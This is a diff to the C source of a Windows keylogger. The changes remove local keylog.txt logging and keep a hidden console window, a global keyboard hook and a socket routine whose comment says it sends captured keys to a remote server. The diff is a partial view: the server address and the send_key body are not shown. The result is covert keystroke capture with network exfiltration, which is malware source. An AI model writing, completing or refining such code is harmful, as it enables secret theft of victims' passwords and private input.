@@ -12,27 +12,19 @@ HHOOK hook;
 // Function prototypes
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
 int send_key(unsigned char key);
-FILE *logFile; // File pointer for logging
 SOCKET sock;   // Socket for sending data
 void cleanup() 
 {
     UnhookWindowsHookEx(hook);
     closesocket(sock);
     WSACleanup();
-    fclose(logFile);
 }
+
 
 int main()
 {
     // Hide the console window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
-    logFile = fopen("keylog.txt", "a"); // Open log file in append mode
-    if (!logFile)
-    {
-        printf("Failed to open log file\n");
-        return 1;
-    }
-
     // Initialize Winsock
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) 
@@ -90,10 +82,10 @@ int main()
     UnhookWindowsHookEx(hook);
     closesocket(sock); // Close the socket
     WSACleanup(); // Clean up Winsock
-    fclose(logFile); // Close the log file
     cleanup();
     return 0;
 }
+
 
 // Function to send the logged key to the remote server
 int send_key(unsigned char key) 
@@ -120,8 +112,6 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
                 PostQuitMessage(0);
                 return 1; // Stop further processing
             }
-            fprintf(logFile, "%c ", (char)vkCode); // Log the key code
-            fflush(logFile); // Flush the output buffer
         }
     }
     return CallNextHookEx(NULL, code, wParam, lParam); // Call the next hook
